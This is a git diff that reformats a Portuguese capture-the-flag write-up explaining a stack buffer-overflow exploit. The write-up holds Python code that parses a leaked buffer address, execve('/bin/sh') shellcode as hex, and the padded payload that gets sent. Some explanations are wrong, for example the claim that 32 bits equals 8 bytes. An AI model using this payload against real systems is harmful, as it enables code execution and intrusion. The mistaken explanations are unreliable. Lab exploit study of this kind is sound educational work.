@@ -12,40 +12,40 @@
 
 **2.** Ao usar o ficheiro _exploit-example.py_ de outros CTFs, podemos adaptar o mesmo para que funcione no CTF desta semana. <br>Explicação do código (do ficheiro "exploit-example.py"):
 
-    **2.1.** Começamos por retirar o valor do endereço do buffer que foi impresso no passo 1) (usamos Regex para obter o endereço de memória).
+**2.1.** Começamos por retirar o valor do endereço do buffer que foi impresso no passo 1) (usamos Regex para obter o endereço de memória).
 
-    ```py
-    txt = p.recvuntil(b":").decode()
-    addr = re.search('0x(.+?).\n', txt).group(1)
-    ```
+```py
+txt = p.recvuntil(b":").decode()
+addr = re.search('0x(.+?).\n', txt).group(1)
+```
 
-    **2.2.** Transformar o código hexadecimal (corresponde à shell) num array de bytes.
+**2.2.** Transformar o código hexadecimal (corresponde à shell) num array de bytes.
 
-    ```py
-    buf = bytearray.fromhex(addr)
-    buf.reverse()
-    ```
+```py
+buf = bytearray.fromhex(addr)
+buf.reverse()
+```
 
-    **2.3.** Criar o frame pointer (váriavel "fp"). Sabemos que o frame pointer encontra-se na stack logo a seguir às variáveis locais. Este também tem um tamanho de 32 bits (ou 8 bytes) (o tamanho do frame pointer depende da arquitetura da máquina). Sendo assim, criamos um número hexadecimal constituído por oito 0's em hexadecimal.
+**2.3.** Criar o frame pointer (váriavel "fp"). Sabemos que o frame pointer encontra-se na stack logo a seguir às variáveis locais. Este também tem um tamanho de 32 bits (ou 8 bytes) (o tamanho do frame pointer depende da arquitetura da máquina). Sendo assim, criamos um número hexadecimal constituído por oito 0's em hexadecimal.
 
-    ![drawing - stack memory](CTFs/Img/Semana8-Desafio2/4.stack.png)
+![drawing - stack memory](CTFs/Img/Semana8-Desafio2/4.stack.png)
 
-    ```py
-    shellcode = bytearray.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80")
-    fp = bytearray.fromhex("0"*8)
-    ```
+```py
+shellcode = bytearray.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80")
+fp = bytearray.fromhex("0"*8)
+```
 
-    **2.4.** Criar a "string" final que será enviada para o exploit.
+**2.4.** Criar a "string" final que será enviada para o exploit.
 
-    ```py
-    finalString = b"a"*77 + fp*2 + buf
-    ```
+```py
+finalString = b"a"*77 + fp*2 + buf
+```
 
-    **2.5.** Mandar esta string para a shellcode. Para conseguirmos fazer isso teremos de colocar a string a seguir ao código hexadecimal referente à shell.
+**2.5.** Mandar esta string para a shellcode. Para conseguirmos fazer isso teremos de colocar a string a seguir ao código hexadecimal referente à shell.
 
-    ```py
-    p.sendline(shellcode + finalString)
-    ```
+```py
+p.sendline(shellcode + finalString)
+```
 
 ### Conclusão
 
